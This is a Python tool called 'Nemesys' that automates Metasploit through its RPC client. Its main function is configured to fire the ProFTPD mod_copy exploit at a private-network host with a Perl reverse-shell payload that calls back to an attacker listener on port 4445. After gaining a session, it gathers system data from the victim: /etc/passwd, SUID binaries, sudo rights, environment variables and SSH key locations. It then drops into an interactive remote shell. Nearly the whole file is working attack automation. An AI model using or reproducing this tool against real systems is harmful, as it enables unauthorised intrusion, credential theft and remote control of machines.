import logging
from pymetasploit3.msfrpc import MsfRpcClient
import time

# Logger configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("Nemesys")

class Nemesys:
    def __init__(self, password, ssl=True):
        """Initializes and connects to the Metasploit client."""
        try:
            self.client = MsfRpcClient(password, ssl=ssl)
            logger.info("üíÄ Connected to Metasploit! Ready for action...")
        except Exception as e:
            logger.error(f"‚ùå Failed to connect to Metasploit: {e}")
            self.client = None

    def search_exploits(self, keyword):
        """Searches for exploits in Metasploit based on a keyword."""
        if not self.client:
            logger.warning("‚ö†Ô∏è Client is not connected.")
            return

        exploits = self.client.modules.exploits
        filtered_exploits = [exploit for exploit in exploits if keyword.lower() in exploit.lower()]
        logger.info(f"üîç Exploits containing '{keyword}':")
        for exploit in filtered_exploits:
            logger.info(f"  - {exploit}")

    def exploit(self, exploit_name, payload_name, exploit_options={}, payload_options={}):
        """
        Executes a specific exploit with the chosen payload and handles post-exploitation tasks.
        
        Args:
            exploit_name (str): Name of the exploit module.
            payload_name (str): Name of the payload module.
            exploit_options (dict): Options for the exploit (e.g., RHOSTS, RPORT).
            payload_options (dict): Options for the payload (e.g., LHOST, LPORT).
        """
        if not self.client:
            logger.warning("‚ö†Ô∏è Client is not connected.")
            return None

        # Run the initial exploit
        exploit_uuid = self._run_exploit(exploit_name, payload_name, exploit_options, payload_options)
        if exploit_uuid:
            session_id = self.get_session_id(exploit_uuid)
            if session_id:
                self._enumerate_system(session_id)
                self.__open_shell(session_id)
            else:
                logger.error("‚ùå No session was established.")
        else:
            logger.error("‚ùå Exploit execution failed.")

    def _run_exploit(self, exploit_name, payload_name, exploit_options, payload_options):
        """Private method to run the specified exploit and return its UUID."""
        exploit = self.client.modules.use("exploit", exploit_name)
        for option, value in exploit_options.items():
            exploit[option] = value

        payload = self.client.modules.use("payload", payload_name)
        for option, value in payload_options.items():
            payload[option] = value

        logger.info(f"‚ò†Ô∏è Running exploit '{exploit_name}' with payload '{payload_name}'...")
        try:
            output = exploit.execute(payload=payload)
            logger.info("üî• Exploit executed successfully.")
            logger.debug(f"Execution output: {output}")
            return output.get('uuid')
        except Exception as e:
            logger.error(f"‚ùå Failed to execute exploit: {e}")
            return None

    def get_session_id(self, uuid, timeout=15):
        """Retrieves the session ID generated by an exploit, if available."""
        if not self.client:
            logger.warning("‚ö†Ô∏è Client is not connected.")
            return None

        end_time = time.time() + timeout
        logger.info(f"‚è≥ Waiting for session to become active...")

        while time.time() < end_time:
            sessions = self.client.sessions.list
            for session in sessions:
                if sessions[session].get('exploit_uuid') == uuid:
                    logger.info(f"üíÄ Session established! Session ID: {session}")
                    return session
            time.sleep(1)

        logger.warning("‚ö†Ô∏è No session found.")
        return None

    def __open_shell(self, session_id):
        """Private method that allows interaction with an open shell session."""
        shell = self.client.sessions.session(session_id)
        logger.info("üë§ Interacting with the session... (Type 'exit' to leave)")

        try:
            while True:
                command = input("üíÄ $ ")
                if command.lower() == 'exit':
                    break
                shell.write(command + '\n')
                time.sleep(1)
                output = shell.read()
                logger.info(output)
        except KeyboardInterrupt:
            logger.info("üëã Exiting interactive session.")

    def _enumerate_system(self, session_id):
        """Performs system enumeration to gather critical information."""
        logger.info("üíÄ Starting system enumeration...")

        # Open the log file to store command outputs
        with open("system_enumeration.log", "a") as log_file:
            # 1. Enumerate OS and kernel version
            self.run_command(session_id, "uname -a", log_file)
            self.run_command(session_id, "cat /etc/issue", log_file)
            self.run_command(session_id, "cat /etc/*release", log_file)

            # 2. Identify kernel vulnerabilities
            self.run_command(session_id, "cat /proc/version", log_file)

            # 3. Enumerate sensitive permissions and configurations
            self.run_command(session_id, "id", log_file)
            self.run_command(session_id, "cat /etc/passwd", log_file)
            self.run_command(session_id, "cat /etc/group", log_file)
            self.run_command(session_id, "find / -perm -4000 -type f 2>/dev/null", log_file)
            self.run_command(session_id, "sudo -l", log_file)

            # 4. Inspect running processes and services
            self.run_command(session_id, "ps aux", log_file)
            self.run_command(session_id, "netstat -tulnp", log_file)
            self.run_command(session_id, "ss -tulnp", log_file)

            # 5. Network configurations and possible pivots
            self.run_command(session_id, "ip route", log_file)
            self.run_command(session_id, "ifconfig", log_file)
            self.run_command(session_id, "ip addr", log_file)

            # 6. Inspect configuration files and passwords
            self.run_command(session_id, "env", log_file)
            self.run_command(session_id, "find / -name '*.ssh'", log_file)

            # 7. Evaluate insecure binaries or vulnerable libraries
            self.run_command(session_id, "python --version", log_file)
            self.run_command(session_id, "perl --version", log_file)
            self.run_command(session_id, "gcc --version", log_file)

            # 8. Manual search for exploits on Exploit-DB and GitHub
            logger.info("üîé Manual search for exploits can be performed on GitHub or Exploit-DB.")

    def run_command(self, session_id, command, log_file):
        """Runs a command on the victim's machine via the session."""
        logger.info(f"üíÄ Running command: {command}")
        shell = self.client.sessions.session(session_id)
        shell.write(command + '\n')
        time.sleep(1)
        output = shell.read()

        # Write the command output to the log file
        log_file.write(f"üíÄ Executed command: {command}\n")
        log_file.write(f"üíÄ Output: {output}\n\n")

def main():
    """Main function that orchestrates the flow using the Nemesys class."""
    client = Nemesys("password")

    # Exploit and payload configuration
    exploit_name = "unix/ftp/proftpd_modcopy_exec"
    payload_name = "cmd/unix/reverse_perl"
    exploit_options = {
        'RHOSTS': '192.168.11.128',
        'SITEPATH': '/var/www/html'
    }
    payload_options = {
        'LHOST': '192.168.11.129',
        'LPORT': 4445
    }

    # Execute the exploit and perform system enumeration
    client.exploit(exploit_name, payload_name, exploit_options, payload_options)

if __name__ == "__main__":
    main()